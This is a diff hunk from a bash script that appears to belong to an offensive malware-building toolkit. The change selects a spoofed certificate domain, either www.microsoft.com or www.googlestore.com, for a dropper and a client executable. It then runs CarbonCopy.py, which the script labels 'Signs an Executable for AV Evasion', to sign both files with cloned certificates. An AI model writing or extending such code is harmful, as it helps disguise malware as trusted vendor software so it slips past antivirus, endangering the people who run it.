@@ -13524,10 +13524,16 @@ if [ "$easter_egg" = "ON" ]; then
    else
       SSL_domain="www.googlestore.com"
    fi
-   echo "${BlueF}[${YellowF}i${BlueF}]${white} spoofed certificate:${YellowF} $SSL_domain"${Reset};sleep 2
    cd $IPATH/obfuscate
+   if [ "$conv" = "1" ] || [ "$conv" = "2" ] || [ "$conv" = "3" ]; then 
+      SSL2="www.microsoft.com" # Client certificate
+   else
+      SSL2="www.googlestore.com" # Client certificate
+   fi
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Dropper certificate:${YellowF} $SSL_domain"${Reset};
+   echo "${BlueF}[${YellowF}i${BlueF}]${white} Client  certificate:${YellowF} $SSL2"${Reset};sleep 2
    cp $IPATH/bin/Client.exe $IPATH/output/Client.exe
-   xterm -T "CarbonCopy - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2 && python3 CarbonCopy.py www.microsoft.com 443 $IPATH/output/Client.exe $IPATH/output/signed-Client.exe && sleep 2"
+   xterm -T "CarbonCopy - Signs an Executable for AV Evasion" -geometry 110x23 -e "python3 CarbonCopy.py $SSL_domain 443 $IPATH/output/$Drop.exe $IPATH/output/signed-$Drop.exe && sleep 2 && python3 CarbonCopy.py $SSL2 443 $IPATH/output/Client.exe $IPATH/output/signed-Client.exe && sleep 2"
    mv $IPATH/output/signed-$Drop.exe $IPATH/output/$Drop.exe
    mv $IPATH/output/signed-Client.exe $IPATH/output/Client.exe
    rm -r certs > /dev/nul 2>&1
